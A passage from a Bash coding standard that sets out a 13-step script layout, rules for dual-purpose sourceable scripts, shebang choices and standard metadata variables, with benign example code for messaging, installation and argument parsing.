- `extglob` - Enables powerful pattern matching: `@(pattern)`, `!(pattern)`, etc.
- `nullglob` - Makes empty globs safe (critical for `for file in *.txt` patterns)

### Step 6: Script Metadata

**Standard metadata variables - make readonly together after declaration.**

```bash
declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "${BASH_SOURCE[0]}")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}
```

**Why these specific variables:**
- `VERSION` - For `--version` flag, logging, compatibility checks
- `SCRIPT_PATH` - Absolute canonical path to script (resolves symlinks)
- `SCRIPT_DIR` - Directory containing script (for relative file access)
- `SCRIPT_NAME` - Script basename (for messages, logging, temp files)

**Why readonly together:** More efficient than individual readonly statements, documents that these are immutable constants.

**Acceptable alternative forms**
```bash
declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}
```

```bash
declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "${BASH_SOURCE[0]}")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}
```

```bash
# parent program location locking, for a specific application with unique namespace
[[ -v ALX_VERSION ]] || {
  declare -xr ALX_VERSION=1.0.0
  #shellcheck disable=SC2155
  declare -xr ALX_PATH=$(realpath -- "${BASH_SOURCE[0]}")
  declare -xr ALX_DIR=${ALX_PATH%/*} ALX_NAME=${ALX_PATH##*/}
}
```

Note:
  - `shellcheck` SC2155 warnings (declare and assign separately...), can be safely ignored when using `realpath` or `readlink`. (If you've got problems with `realpath`, then you have much greater problems elsewhere.)
  - On some BCS compliant systems `realpath` is set up as a builtin, which is 10x faster than using an executable.

### Step 7: Global Variable Declarations

**All global variables declared up front with types.**

```bash
# Configuration variables
declare -- PREFIX=/usr/local
declare -- CONFIG_FILE=''
declare -- LOG_FILE=''

# Runtime state
declare -i VERBOSE=0
declare -i DRY_RUN=0
declare -i FORCE=0

# Arrays for accumulation
declare -a INPUT_FILES=()
declare -a WARNINGS=()
```

**Type declarations:**

Always:

- `declare -i` for integers (enables arithmetic context)
- `declare --` for strings (explicit string type)
- `declare -a` for indexed arrays
- `declare -A` for associative arrays

**Why up front:** Makes all globals visible in one place, prevents accidental creation of globals in functions, documents script's state.

### Step 8: Color Definitions (if terminal output)

**Terminal detection and color code definitions.**

```bash
if [[ -t 1 && -t 2 ]]; then
  declare -r RED=$'\033[0;31m' GREEN=$'\033[0;32m' YELLOW=$'\033[0;33m' CYAN=$'\033[0;36m' NC=$'\033[0m'
else
  declare -r RED='' GREEN='' YELLOW='' CYAN='' NC=''
fi
```

Acceptable:

```bash
# Detect terminal capabilities
if [[ -t 1 ]] && command -v tput >/dev/null 2>&1; then
  RED=$(tput setaf 1)
  GREEN=$(tput setaf 2)
  YELLOW=$(tput setaf 3)
  BLUE=$(tput setaf 4)
  BOLD=$(tput bold)
  RESET=$(tput sgr0)
  readonly -- RED GREEN YELLOW BLUE BOLD RESET
else
  # Not a terminal or tput unavailable - no colors
  declare -r RED='' GREEN='' YELLOW='' BLUE='' BOLD='' RESET=''
fi
```

**Why conditional:** Colors only work on terminals - don't use them when output is piped or redirected.

**Skip this step** if your script doesn't use colored output.

### Step 9: Utility Functions

**Messaging and helper functions - lowest level, used by everything else.**

Users should comment out or remove elements that are not required.

```bash
declare -i VERBOSE=1
#declare -i DEBUG=0 PROMPT=1

# _Core messaging function using FUNCNAME
_msg() {
  local -- prefix="$SCRIPT_NAME:" msg
  case ${FUNCNAME[1]} in
    vecho)   : ;;
    info)    prefix+=" ${CYAN}◉${NC}" ;;
    warn)    prefix+=" ${YELLOW}▲${NC}" ;;
#    debug)   prefix+=" ${CYAN}DEBUG${NC}" ;;
    success) prefix+=" ${GREEN}✓${NC}" ;;
    error)   prefix+=" ${RED}✗${NC}" ;;
    *)       ;;
  esac
  for msg in "$@"; do printf '%s %s\n' "$prefix" "$msg"; done
}

# Verbose output (respects VERBOSE flag)
vecho() { ((VERBOSE)) || return 0; _msg "$@"; }
# Info messages
info() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
# Warnings (non-fatal)
warn() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
# Debug output (respects DEBUG flag)
#debug() { ((DEBUG)) || return 0; >&2 _msg "$@"; }
# Success messages
success() { ((VERBOSE)) || return 0; >&2 _msg "$@" || return 0; }
# Error output (unconditional)
error() { >&2 _msg "$@"; }
# Exit with error
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
# Yes/no prompt
yn() {
  #((PROMPT)) || return 0
  local -- REPLY
  >&2 read -r -n 1 -p "$(2>&1 warn "${1:-'Continue?'}") y/n "
  >&2 echo
  [[ ${REPLY,,} == y ]]
}
```

For very simple programs with no need for color or verbosity control, user may simplify the standard messaging functions like this:

```bash
info() { >&2 echo "${FUNCNAME[0]}: $*"; }
debug() { >&2 echo "${FUNCNAME[0]}: $*"; }
success() { >&2 echo "${FUNCNAME[0]}: $*"; }
error() { >&2 echo "${FUNCNAME[0]}: $*"; }
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
```

User is strongly encouraged to use these function names for logging output, for both consistency, and for when that quick-and-dirty test script of yours evolves into a Magnum Opus, and now you need proper coloured and verbosity controlled message functions, like you should have used straight from the beginning. You're welcome.

**Why these come first:** Business logic needs messaging, validation, and error handling. These utilities must exist before anything calls them.

**Production optimization:** Important: Remove unused functions **after** script is mature (see Section 6 of main standard).

### Step 10: Business Logic Functions

**Core functionality - the actual work of the script.**

```bash
# Check if all required commands are available
check_prerequisites() {
  # This function requires message functions error(), die(), and success()
  local -i missing=0
  local -- cmd

  for cmd in git make gcc; do
    if ! command -v "$cmd" >/dev/null 2>&1; then
      error "Required command not found ${cmd@Q}"
      missing+=1
    fi
  done

  ((missing==0)) || die 1 "Missing $missing required commands"
  success 'All prerequisites satisfied'
}

# Validate configuration
validate_config() {
  # This function requires global var PREFIX, and message functions die() and success()
  [[ -n "$PREFIX" ]] || die 22 'PREFIX cannot be empty'
  [[ -d "$PREFIX" ]] || die 2 "PREFIX directory does not exist ${PREFIX@Q}"

  success 'Configuration validated'
}

# Install files to target directory
install_files() {
  # This function requires global var DRY_RUN, and message functions info() and success()
  local -- source_dir=$1
  local -- target_dir=$2

  if ((DRY_RUN)); then
    info "[DRY-RUN] Would install files from ${source_dir@Q} to ${target_dir@Q}"
    return 0
  fi

  [[ -d "$source_dir" ]] || die 2 "Source directory not found ${source_dir@Q}"
  mkdir -p "$target_dir" || die 1 "Failed to create target directory ${target_dir@Q}"

  cp -r "$source_dir"/* "$target_dir"/ || die 1 'Installation failed'
  success "Installed files to ${target_dir@Q}"
}

# Generate configuration file
generate_config() {
  # This function requires global vars DRY_RUN, PREFIX, and VERSION; and message functions info() and success()
  local -- config_file=$1

  ((DRY_RUN==0)) || {
    info "[DRY-RUN] Would generate config ${config_file@Q}"
    return 0
  }

  cat > "$config_file" <<EOF
# Generated configuration
PREFIX=$PREFIX
VERSION=$VERSION
INSTALL_DATE=$(date -u +%Y-%m-%dT%H:%M:%SZ)
EOF

  success "Generated config ${config_file@Q}"
}
```

**Organize bottom-up within business logic:**
- Lower-level functions first (validation, file operations)
- Higher-level functions later (orchestration)
- Each function can call functions defined above it

### Step 11: `main()` Function and Options/Argument Parsing

**Required for scripts over ~200 lines - orchestrates everything.**

```bash
main() {
  # Parse arguments
  while (($#)); do
    case $1 in
      -p|--prefix)   noarg "$@"; shift
                     PREFIX=$1 ;;

      -v|--verbose)  VERBOSE+=1 ;;
      -q|--quiet)    VERBOSE=0 ;;
      -n|--dry-run)  DRY_RUN=1 ;;
      -f|--force)    FORCE=1 ;;

      -V|--version)  echo "$SCRIPT_NAME $VERSION"; return 0 ;;
      -h|--help)     show_help; return 0 ;;

      -[pvqnfVh]*) #shellcheck disable=SC2046 #split up single options
                     set -- '' $(printf -- "-%c " $(grep -o . <<<"${1:1}")) "${@:2}" ;;
      -*)            die 22 "Invalid option ${1@Q}" ;;
      *)             INPUT_FILES+=("$1") ;;
    esac
    shift
  done

  # Make configuration readonly after parsing
  readonly -- PREFIX CONFIG_FILE LOG_FILE
  readonly -i VERBOSE DRY_RUN FORCE

  # Execute workflow
  ((DRY_RUN)) && info 'DRY-RUN mode enabled' ||:

  check_prerequisites
  validate_config
  install_files "$SCRIPT_DIR"/data "$PREFIX"/share
  generate_config "$PREFIX"/etc/myapp.conf

  success 'Installation complete'
}
```

**Why main() is required:**
- **Testing** - Can source script and test `main()` with specific arguments
- **Organization** - Single entry point makes execution flow clear
- **Scoping** - Argument parsing can use local variables in main()
- **Debugging** - Easy to add debug hooks before/after main()

**Exception:** Scripts under 100 lines can skip `main()` and run directly.

### Step 12: Script Invocation

**Execute main with all arguments.**

```bash
main "$@"
```

**ALWAYS quote `"$@"`** to preserve argument array properly.

**For small scripts without main():** Just write business logic directly here.

### Step 13: End Marker

**Mandatory final line.**

```bash
#fin
```

OR:

```bash
#end
```

**Why mandatory:**
- Visual confirmation script is complete (not truncated)
- Some editors/tools look for end-of-file marker
- Consistency across all scripts


---

## Complete Example

**For a comprehensive, production-quality installation script demonstrating all 13 steps in action, see BCS010101 (Complete Working Example).**

The example includes:
- All 13 mandatory steps correctly implemented
- Full working code (462 lines)
- Dry-run mode, force mode, argument parsing
- Systemd integration, configuration generation
- Professional help text and error handling

---

## Anti-Patterns

**For common violations of the 13-step layout and their corrections, see BCS010102 (Common Anti-Patterns).**

Covers eight critical anti-patterns:
1. Missing `set -euo pipefail`
2. Variables used before declaration
3. Business logic before utilities
4. No `main()` in large scripts
5. Missing end marker
6. Premature `readonly`
7. Scattered declarations
8. Unprotected sourcing

---

## Edge Cases and Variations

**For special scenarios where the layout may be modified, see BCS010103 (Edge Cases and Variations).**

Covers five edge cases:
1. Tiny scripts (<200 lines) - May skip `main()`
2. Sourced libraries - Skip `set -e`, `main()`, invocation
3. External configuration - Add config sourcing
4. Platform-specific code - Add platform detection
5. Cleanup traps - Add trap handlers

---
## Recommended General Structure of Bash Scripts

Man=Mandatory Opt=Optional Rec=Recommended

### Executable Scripts

| Order | Status | Step | Comments |
|  0 | Man | '^#!shebang' ||
|  1 | Opt | '^#shellcheck' ||
|  2 | Opt | '^# ' | Multi-line Comments. Ends at first non-'^# ' line. Should usually have at least one short description line.|
|  3 | Man | 'set -euo pipefail' | MANDATORY first command before any other commands are executed|
|  4 | Opt | Bash 5 version test | (very rarely needed) |
|  5 | Rec | 'shopt'|standard 'shopt' settings|
|  6 | Rec | Script Metadata||
|  7 | Rec | Global Variable Declarations||
|  8 | Rec | Color Definitions | (if terminal output) |
|  9 | Rec | Utility Functions | (including Messaging) |
| 10 | Rec | Business Logic Functions||
| 11 | Rec | 'main()' | Function and Full Options/Argument Parsing|
| 12 | Rec | 'main "$@"'| Script Invocation|
| 13 | Man | '#end' Marker||

### Module/Library Scripts

| Order | Status | Step
|  0 | Man | '^#!shebang' |
|  1 | Opt | '^#shellcheck' |
|  2 | Opt | '^# ' |
|  4 | Opt | Bash 5 version test |
|  6 | Opt | Script Metadata|
|  7 | Opt | Global Variable Declarations|
|  8 | Opt | Color Definitions |
|  9 | Opt | Utility Functions |
| 10 | Rec | Business Logic Functions|
| 13 | Man | '#end' Marker|

### Combined Module/Library-Executable Scripts

| Order | Status | Step
|  0 | Man | '^#!shebang' |
|  1 | Opt | '^#shellcheck' |
|  2 | Opt | '^# ' |
|  3 | Opt | 'set -euo pipefail' |
|  4 | Opt | Bash 5 version test |
|  5 | Opt | 'shopt'|
|  6 | Opt | Script Metadata|
|  7 | Opt | Global Variable Declarations|
|  8 | Opt | Color Definitions |
|  9 | Opt | Utility Functions |
| 10 | Man | Business Logic Functions|
| 14    | Man | `[[ "${BASH_SOURCE[0]}" == "$0" ]] || return 0` |
| 14.0  | Man | '^#!shebang' ||
| 14.1  | Opt | '^#shellcheck' ||
| 14.2  | Opt | '^# ' | Multi-line Comments. Ends at first non-'^# ' line. Should usually have at least one short description line.|
| 14.3  | Man | 'set -euo pipefail' | MANDATORY first command before any other commands are executed|
| 14.4  | Opt | Bash 5 version test | (very rarely needed) |
| 14.5  | Rec | 'shopt'|standard 'shopt' settings|
| 14.6  | Rec | Script Metadata||
| 14.7  | Rec | Global Variable Declarations||
| 14.8  | Rec | Color Definitions | (if terminal output) |
| 14.9  | Rec | Utility Functions | (including Messaging) |
| 14.10 | Rec | Business Logic Functions||
| 14.11 | Rec | 'main()' | Function and Full Options/Argument Parsing|
| 14.12 | Rec | 'main "$@"'| Script Invocation|
| 14.13 | Man | '#end' Marker||

---

## Summary

**The 13-step layout is strongly recommended** - it's the foundation of all scripts in this coding standard. This structure:

1. **Guarantees safety** - Error handling comes first, nothing runs without it
2. **Ensures consistency** - Every script follows the same pattern
3. **Enables testing** - `main()` function allows sourcing for tests
4. **Prevents errors** - Bottom-up organization means dependencies are always defined before use
5. **Documents intent** - Structure itself tells you what the script does and how it works
6. **Simplifies maintenance** - Know where everything goes, no guessing

**For scripts over 100 lines**, all 13 steps should be done. **For smaller scripts**, steps 11-12 (main function) can be skipped, but all other steps remain required.

**When in doubt**, follow the complete 13-step structure - the benefits far outweigh the minor overhead. Every production script should follow this pattern exactly.

This layout is the result of years of experience and represents best practices for Bash scripting. Deviations from this structure should be rare and well-justified.


---


**Rule: BCS010201**

### Dual-Purpose Scripts (Executable and Sourceable)

Some scripts are designed to work both as standalone executables and as source libraries that can be loaded into other scripts. For these dual-purpose scripts, `set -euo pipefail` and `shopt` settings must **ONLY** be applied when the script is executed directly, **NOT** when it is sourced.

**Rationale:** When a script is sourced, applying `set -e` or modifying `shopt` settings would alter the calling shell's environment, potentially breaking the caller's error handling or glob behavior. The sourced script should only provide functions and variables without side effects on the caller's shell state.

**Recommended pattern (early return):**
```bash
#!/bin/bash
# Description of dual-purpose script

# Function definitions (available in both modes)
my_function() {
  local -- arg="$1"
  [[ -n "$arg" ]] || return 1
  echo "Processing: $arg"
}
declare -fx my_function

# Early return for sourced mode - stops here when sourced
[[ ${BASH_SOURCE[0]} != "$0" ]] && return 0

# -----------------------------------------------------------------------------
# Executable code starts here (only runs when executed directly)
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

# Metadata initialization with guard (allows re-sourcing safety)
if [[ ! -v SCRIPT_VERSION ]]; then
  declare -x SCRIPT_VERSION=1.0.0
  #shellcheck disable=SC2155
  declare -x SCRIPT_PATH=$(realpath -- "$0")
  declare -x SCRIPT_DIR=${SCRIPT_PATH%/*}
  declare -x SCRIPT_NAME=${SCRIPT_PATH##*/}
  readonly -- SCRIPT_VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME
fi

# Helper functions (only needed for executable mode)
show_help() {
  cat <<EOT
$SCRIPT_NAME $SCRIPT_VERSION - Description

Usage: $SCRIPT_NAME [options] [arguments]
EOT
}

# Main execution logic
my_function "$@"

#fin
```

**Pattern breakdown:**

1. **Function definitions first** (lines 4-9)
   - Define all library functions at the top
   - Export with `declare -fx` if needed by subshells
   - Functions become available when sourced

2. **Early return** (line 12)
   - Single line: `[[ ${BASH_SOURCE[0]} != "$0" ]] && return 0`
   - When sourced: functions loaded, then immediate clean exit
   - When executed: test fails, continues to next line
   - Using `!=` (not equal) reads more naturally than `==`

3. **Visual separator** (line 14)
   - Clear comment line marks executable section boundary
   - Makes code organization obvious to readers

4. **Set and shopt** (lines 15-16)
   - Only applied when executed (never when sourced)
   - Placed immediately after the separation line

5. **Metadata with guard** (lines 18-24)
   - `if [[ ! -v SCRIPT_VERSION ]]` prevents re-initialization
   - Safe to source multiple times without errors
   - Uses `-v` to test if variable is set

**Alternative pattern (if/else block):**

For scripts requiring different initialization in each mode:
```bash
#!/bin/bash

# Functions first
process_data() { ... }
declare -fx process_data

# Dual-mode initialization
if [[ ${BASH_SOURCE[0]} == "$0" ]]; then
  # EXECUTED MODE
  set -euo pipefail
  declare -r DATA_DIR=/var/lib/myapp
  process_data "$DATA_DIR"
else
  # SOURCED MODE - different initialization
  declare -r DATA_DIR=${DATA_DIR:-/tmp/test_data}
  # Export functions, return to caller
fi
```

**Key principles:**
- **Prefer early return pattern** for simplicity and clarity
- Place all function definitions **before** the sourced/executed detection
- Only apply `set -euo pipefail` and `shopt` in executable section
- Use `return` (not `exit`) for errors when sourced
- Guard metadata initialization with `[[ ! -v VARIABLE ]]` for idempotence
- Test both modes: `./script.sh` (execute) and `source script.sh` (source)

**Real-world examples:**
- The `bash-coding-standard` script in this repository
- The `getbcscode.sh` script provides `get_BCS_code_from_rule_filename()` function

**Common use cases:**
- Utility libraries that can also demonstrate usage when executed
- Scripts that provide reusable functions plus a CLI interface
- Test frameworks that can be sourced for functions or run for tests


---


**Rule: BCS0102**

## Shebang and Initial Setup
First lines of all scripts must include a `#!shebang`, global `#shellcheck` definitions (optional), a brief description of the script, and first command `set -euo pipefail`.

```bash
#!/bin/bash
#shellcheck disable=SC1090,SC1091
# Get directory sizes and report usage statistics
set -euo pipefail
```

**Allowable shebangs:**

1. `#!/bin/bash` - **Most portable**, works on most Linux systems
   - Use when: Script will run on known Linux systems with bash in standard location

2. `#!/usr/bin/bash` - **FreeBSD/BSD systems**
   - Use when: Targeting BSD systems where bash is in /usr/bin

3. `#!/usr/bin/env bash` - **Maximum portability**
   - Use when: Bash location varies (different systems, development environments)
   - Searches PATH for bash, works across diverse environments

**Rationale:** These three shebangs cover all common scenarios while maintaining compatibility. The first command must be `set -euo pipefail` to enable strict error handling immediately, before any other commands execute.


---


**Rule: BCS0103**

## Script Metadata

**Every script must declare standard metadata variables (VERSION, SCRIPT_PATH, SCRIPT_DIR, SCRIPT_NAME) immediately after `shopt` settings and before any other code. Declare them as readonly using `declare -r`.**

**Rationale:**

- **Reliable Path Resolution**: Using `realpath` provides canonical absolute paths and fails early if the script doesn't exist, preventing errors when script is called from different directories
- **Self-Documentation**: VERSION provides clear versioning for deployment and debugging
- **Resource Location**: SCRIPT_DIR enables reliable loading of companion files, libraries, and configuration
- **Logging and Error Messages**: SCRIPT_NAME provides consistent script identification in logs and error output
- **Defensive Programming**: Making metadata readonly prevents accidental modification that could break resource loading
- **Consistency**: Standard metadata variables work the same way across all scripts, reducing cognitive load

**Standard metadata pattern:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

# Script metadata - immediately after shopt
declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Rest of script follows
```

**Metadata variables explained:**

**1. VERSION**
- **Purpose**: Semantic version of the script
- **Format**: Major.Minor.Patch (e.g., '1.0.0', '2.3.1')
- **Used for**: `--version` output, logging, deployment tracking
- **Example usage**: `echo "$SCRIPT_NAME $VERSION"`

```bash
VERSION=1.0.0

# Display version
show_version() {
  echo "$SCRIPT_NAME $VERSION"
}

# Log with version
info "Starting $SCRIPT_NAME $VERSION"
```

**2. SCRIPT_PATH**
- **Purpose**: Absolute canonical path to the script file
- **Resolves**: Symlinks, relative paths, `.` and `..` components
- **Command**: `realpath -- "$0"`
  - `--`: Prevents option injection if filename starts with `-`
  - `"$0"`: Current script name/path
  - **Behavior**: Fails if file doesn't exist (intentional - catches errors early)
  - **Builtin available**: A loadable builtin for realpath is available for maximum performance

```bash
SCRIPT_PATH=$(realpath -- "$0")
# Examples:
# /usr/local/bin/myapp
# /home/user/projects/app/deploy.sh
# /opt/app/bin/processor

# Use for logging script location
debug "Running from ${SCRIPT_PATH@Q}"
```

**3. SCRIPT_DIR**
- **Purpose**: Directory containing the script
- **Derivation**: `${SCRIPT_PATH%/*}` removes last `/` and everything after
- **Used for**: Loading companion files, finding resources relative to script

```bash
SCRIPT_DIR=${SCRIPT_PATH%/*}
# Examples:
# If SCRIPT_PATH=/usr/local/bin/myapp
# Then SCRIPT_DIR=/usr/local/bin

# If SCRIPT_PATH=/home/user/projects/app/bin/deploy.sh
# Then SCRIPT_DIR=/home/user/projects/app/bin

# Load library from same directory
source "$SCRIPT_DIR"/lib/common.sh

# Read configuration from relative path
config_file="$SCRIPT_DIR"/../conf/app.conf
```

**4. SCRIPT_NAME**
- **Purpose**: Base name of the script (filename only, no path)
- **Derivation**: `${SCRIPT_PATH##*/}` removes everything up to last `/`
- **Used for**: Error messages, logging, `--help` output

```bash
SCRIPT_NAME=${SCRIPT_PATH##*/}
# Examples:
# If SCRIPT_PATH=/usr/local/bin/myapp
# Then SCRIPT_NAME=myapp

# If SCRIPT_PATH=/home/user/deploy.sh
# Then SCRIPT_NAME=deploy.sh

# Use in error messages
die() { (($# < 2)) || >&2 echo "$SCRIPT_NAME: error: ${*:2}"; exit "${1:-0}"; }

# Use in help text
show_help() {
  cat << EOF
Usage: $SCRIPT_NAME [OPTIONS] FILE

Process FILE according to configured rules.
EOF
}
```

**Why declare -r for metadata:**

```bash
# ✓ Correct - declare as readonly immediately
declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# This pattern:
# 1. Makes each variable immediately immutable at declaration
# 2. Clear, concise single-line declarations
# 3. SCRIPT_DIR and SCRIPT_NAME combined (both derived from SCRIPT_PATH)
# 4. SC2155 disable documents intentional command substitution in declare -r
```

**Using metadata for resource location:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Load libraries relative to script location
source "$SCRIPT_DIR"/lib/logging.sh
source "$SCRIPT_DIR"/lib/validation.sh

# Load configuration
declare -- config_file="$SCRIPT_DIR"/../etc/app.conf
[[ -f "$config_file" ]] && source "$config_file" ||:

# Access data files
declare -- data_dir="$SCRIPT_DIR"/../share/data
[[ -d "$data_dir" ]] || die 2 "Data directory not found ${data_dir@Q}"

# Use metadata in logging
info "Starting $SCRIPT_NAME $VERSION"
debug "Script location: ${SCRIPT_PATH@Q}"
debug "Config: $config_file"
```

**Edge case: Script in root directory**

```bash
# If script is /myscript (in root directory)
SCRIPT_PATH=/myscript
SCRIPT_DIR=${SCRIPT_PATH%/*}  # Results in empty string!

# Solution: Handle this edge case if script might be in /
SCRIPT_DIR=${SCRIPT_PATH%/*}
[[ -n "$SCRIPT_DIR" ]] || SCRIPT_DIR='/'
readonly -- SCRIPT_DIR

# Or use dirname (less portable)
SCRIPT_DIR=$(dirname -- "$SCRIPT_PATH")
```

**Edge case: Sourced vs executed**

```bash
# When script is sourced, $0 is the calling shell, not the script
# To detect if sourced:
if [[ "${BASH_SOURCE[0]}" != "$0" ]]; then
  # Script is being sourced
  SCRIPT_PATH=$(realpath -- "${BASH_SOURCE[0]}")
else
  # Script is being executed
  SCRIPT_PATH=$(realpath -- "$0")
fi

SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
```

**Why realpath over readlink:**

```bash
# realpath is the canonical BCS approach because:
# 1. Simpler syntax: No need for -e and -n flags (default behavior is correct)
# 2. Builtin available: Loadable builtin provides maximum performance
# 3. Widely available: Standard on modern Linux systems
# 4. POSIX compliant: realpath is in POSIX, readlink is GNU-specific
# 5. Consistent behavior: realpath fails if file doesn't exist (catches errors early)

# ✓ Correct - use realpath
SCRIPT_PATH=$(realpath -- "$0")

# ✓ Acceptable, but usually prefer realpath - readlink requires -en flags (more complex, GNU-specific)
SCRIPT_PATH=$(readlink -en -- "$0")

# Note: realpath without -m will fail if file doesn't exist
# This is INTENTIONAL - we want to catch missing scripts early
# If you need to allow missing files, use: realpath -m -- "$0"
# (But for SCRIPT_PATH, we always want existing files)

# For maximum performance, load realpath as builtin:
# enable -f /usr/local/lib/bash-builtins/realpath.so realpath
```

**About shellcheck SC2155:**

```bash
# shellcheck SC2155 warns about command substitution in declare -r
# This is because it masks the return value of the command:

declare -r SCRIPT_PATH=$(realpath -- "$0")
#shellcheck disable=SC2155

# Why we disable SC2155 for SCRIPT_PATH:
# 1. realpath failure is acceptable here - we WANT the script to fail early
#    if the script file doesn't exist
# 2. The metadata variables are set exactly once at script startup
# 3. The command substitution is simple and well-understood
# 4. The pattern is concise and immediately makes the variable readonly

# Alternative (avoiding SC2155) would be more verbose:
SCRIPT_PATH=$(realpath -- "$0") || die 1 'Failed to resolve script path'
declare -r SCRIPT_PATH

# We choose the concise pattern with documented disable directive
# because the failure mode (script doesn't exist) should cause immediate
# script termination anyway.
```

**Anti-patterns to avoid:**

```bash
# ✗ Wrong - using $0 directly without realpath or readlink
SCRIPT_PATH="$0"  # Could be relative path or symlink!

# ✓ Correct - resolve with realpath
SCRIPT_PATH=$(realpath -- "$0")

# ✗ Wrong - using dirname and basename (requires external commands)
SCRIPT_DIR=$(dirname "$0")
SCRIPT_NAME=$(basename "$0")

# ✓ Correct - use parameter expansion (faster, more reliable)
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}

# ✗ Wrong - using PWD for script directory
SCRIPT_DIR=$PWD  # Wrong! This is current working directory, not script location

# ✓ Correct - derive from SCRIPT_PATH
SCRIPT_DIR=${SCRIPT_PATH%/*}

# ✗ Wrong - making readonly individually
readonly VERSION=1.0.0
readonly SCRIPT_PATH=$(realpath -- "$0")
readonly SCRIPT_DIR=${SCRIPT_PATH%/*}  # Can't assign to readonly variable!

# ✓ Correct - declare as readonly immediately
declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*}

# ✗ Wrong - no VERSION variable
# Every script should have a version for tracking

# ✓ Correct - include VERSION
VERSION=1.0.0

# ✗ Wrong - using inconsistent variable names
SCRIPT_VERSION=1.0.0  # Should be VERSION
SCRIPT_DIRECTORY="$SCRIPT_DIR"  # Redundant
MY_SCRIPT_PATH="$SCRIPT_PATH"  # Non-standard

# ✓ Correct - use standard names
VERSION=1.0.0
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}

# ✗ Wrong - declaring metadata late in script
# ... 50 lines of code ...
VERSION=1.0.0  # Too late! Should be near top

# ✓ Correct - declare immediately after shopt
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob
VERSION=1.0.0  # Right after shopt
```

**Complete example with metadata usage:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

# Script metadata
declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Global variables
declare -- LOG_FILE="$SCRIPT_DIR"/../logs/"$SCRIPT_NAME".log
declare -- CONFIG_FILE="$SCRIPT_DIR"/../etc/"$SCRIPT_NAME".conf

# Messaging functions
info() {
  echo "[$SCRIPT_NAME] $*" | tee -a "$LOG_FILE"
}

error() {
  >&2 echo "[$SCRIPT_NAME] ERROR: $*" | tee -a "$LOG_FILE"
}

die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }

# Show version
show_version() {
  echo "$SCRIPT_NAME $VERSION"
}

# Show help with script name
show_help() {
  cat <<HELP
$SCRIPT_NAME $VERSION - Process data

Process data according to configuration.

Usage: $SCRIPT_NAME [OPTIONS]

Options:
  -h, --help     Show this help message
  -V, --version  Show version information

Examples:
  $SCRIPT_NAME -V
HELP
}

# Load configuration from script directory
load_config() {
  if [[ -f "$CONFIG_FILE" ]]; then
    info "Loading configuration from ${CONFIG_FILE@Q}"
    source "$CONFIG_FILE"
  else
    die 2 "Configuration file not found ${CONFIG_FILE@Q}"
  fi
}

main() {
  info "Starting $SCRIPT_NAME $VERSION"
  info "Running from: ${SCRIPT_PATH@Q}"

  load_config

  # Main logic here
  info 'Processing complete'
}

main "$@"

#fin
```

**Testing metadata:**

```bash
# Test that metadata is set correctly
test_metadata() {
  # VERSION should be set
  [[ -n "$VERSION" ]] || die 1 'VERSION not set'

  # SCRIPT_PATH should be absolute
  [[ "$SCRIPT_PATH" == /* ]] || die 1 'SCRIPT_PATH is not absolute'

  # SCRIPT_PATH should exist
  [[ -f "$SCRIPT_PATH" ]] || die 1 'SCRIPT_PATH does not exist'

  # SCRIPT_DIR should be a directory
  [[ -d "$SCRIPT_DIR" ]] || die 1 'SCRIPT_DIR is not a directory'

  # SCRIPT_NAME should not contain /
  [[ "$SCRIPT_NAME" != */* ]] || die 1 'SCRIPT_NAME contains /'

  # All should be readonly
  readonly -p | grep -q 'VERSION' || die 1 'VERSION not readonly'
  readonly -p | grep -q 'SCRIPT_PATH' || die 1 'SCRIPT_PATH not readonly'

  success 'Metadata validation passed'
}
```

**Summary:**

- **Always declare metadata** immediately after `shopt` settings
- **Use standard names**: VERSION, SCRIPT_PATH, SCRIPT_DIR, SCRIPT_NAME
- **Use realpath** to resolve SCRIPT_PATH reliably (canonical BCS approach)
- **Derive SCRIPT_DIR and SCRIPT_NAME** from SCRIPT_PATH using parameter expansion
